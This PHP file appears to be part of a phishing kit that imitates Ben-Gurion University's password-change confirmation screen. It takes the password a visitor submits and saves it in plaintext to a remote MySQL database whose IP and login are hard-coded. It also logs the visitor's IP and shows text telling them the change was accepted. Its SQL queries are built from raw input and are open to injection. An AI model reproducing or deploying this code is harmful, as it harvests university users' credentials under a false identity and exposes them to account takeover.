<?php
session_start();
if($_SESSION['cp'] == 1) {
    header("Location: https://tamrur.bgu.ac.il/wcp/login.php?isheb=0");
}
$servername = "151.80.61.178";
$username = "u4_yJSAHQoJbd";
$password = "l0Zv^sx1d@b4HfrukEeqRj8^";
$dbname = "s4_mini-project";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
//die("Connection failed: " . $conn->connect_error);
    echo "Failed to connect";
}

$sql = "UPDATE `Passwords` SET `newpassword`='". $_POST['newpass'] ."' WHERE `userid`='". $_SESSION['id'] ."'";

if($conn->query($sql) === true) {
	if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
    {
      $ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
    {
      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $ip=$_SERVER['REMOTE_ADDR'];
    }
	$sql = "INSERT INTO `IPS` (`IP`)
	VALUES ('" . $ip . "')";

	if($conn->query($sql) === true) {
	} else {
	}
?>
	<!DOCTYPE html>
	<html lang="en">
	<head>
	    <title>Password change - screen 2 out of 2</title>
		<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=windows-1255">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
	    <link href="n3style.css" rel="Stylesheet" type="text/css">
	</head>
	<body dir=ltr >


	<h1>
	Password change - screen 2 out of 2</h1>
	<hr>
	<span class="engLargerText">Password change accepted.
	</span><div class="BR"></div><span class="engLargerText">The password on all the systems will be updated at the next round hour.
	</span><div class="BR"></div><span class="engLargerText">For information security reasons, we advise you to close this window now.</span><div class="BR"></div><div class="myBreak">
	</div>
	<hr>
	<span class="engText" id="forlink">In order to return to the home page of BGU click here:</span>

	<a href="http://www.bgu.ac.il" id="bgulink"  aria-labelledby="forlink">
	<span class="engText">Ben-Gurion University Home Page</span></a>
	<div class="myBreak">
	</div>
	<span class="engText">In case of problems please contact the Computation Center Helpdesk at helpdesk@bgu.ac.il or 08-6477171
	</span><div class="BR"></div><span class="engText">Building 58 Room No. 1 on the ground floor from Sunday to Thursday from 08.00 to 16.00</span><div class="BR"></div>
<?php
} else {
}
$conn->close();
?>
